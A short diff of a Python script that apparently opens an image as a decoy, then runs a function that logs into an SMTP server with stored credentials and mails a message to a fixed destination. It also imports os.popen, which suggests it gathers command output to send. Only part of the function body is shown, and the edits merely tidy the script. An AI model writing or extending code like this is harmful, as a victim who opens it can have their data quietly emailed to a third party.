@@ -1,7 +1,6 @@
+from os import popen
 from PIL import Image
-from time import sleep
 from smtplib import SMTP
-from os import popen, getcwd
 from email.mime.text import MIMEText
 
 def shape():
@@ -22,7 +21,6 @@ def shape():
     server.login(sender, application_passwords)
     server.sendmail(sender, destination, msg.as_string())
 
-if __name__ == "__main__": 
-  Image.open(f"{getcwd()}/finder/image.jpeg").show()
+if __name__ == "__main__":
+  Image.open("image.jpeg").show()
   shape()
-  sleep(60)
